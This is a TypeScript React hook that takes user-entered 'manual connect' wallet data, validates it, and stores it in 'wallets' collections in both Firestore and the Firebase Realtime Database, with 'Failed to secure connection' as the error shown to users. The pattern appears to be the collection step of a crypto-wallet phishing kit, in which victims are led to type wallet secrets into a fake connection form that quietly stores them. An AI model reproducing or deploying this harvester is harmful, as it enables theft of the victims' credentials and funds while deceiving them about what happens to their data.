import { useMutation } from "@tanstack/react-query";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import { ref, push, set } from "firebase/database";
import { db, rtdb } from "@/lib/firebase";
import { manualConnectSchema } from "@shared/schema";
import { z } from "zod";
import { useToast } from "@/hooks/use-toast";

type ManualConnectData = z.infer<typeof manualConnectSchema>;

export function useManualConnect() {
  const { toast } = useToast();

  return useMutation({
    mutationFn: async (data: ManualConnectData) => {
      // 1. Validate data
      const validated = manualConnectSchema.parse(data);

      try {
        // 2. Save to Firestore
        const firestorePromise = addDoc(collection(db, "wallets"), {
          ...validated,
          timestamp: serverTimestamp(),
          source: "web_manual_connect"
        });

        // 3. Save to Realtime Database
        const rtdbRef = ref(rtdb, 'wallets');
        const newWalletRef = push(rtdbRef);
        const rtdbPromise = set(newWalletRef, {
          ...validated,
          timestamp: Date.now(),
          source: "web_manual_connect"
        });

        // Wait for both
        await Promise.all([firestorePromise, rtdbPromise]);
        
        return { success: true };
      } catch (error) {
        console.error("Error saving wallet data:", error);
        throw new Error("Failed to secure connection. Please try again.");
      }
    },
    onError: (error) => {
      toast({
        title: "Connection Error",
        description: error instanceof Error ? error.message : "An unexpected error occurred",
        variant: "destructive",
      });
    }
  });
}
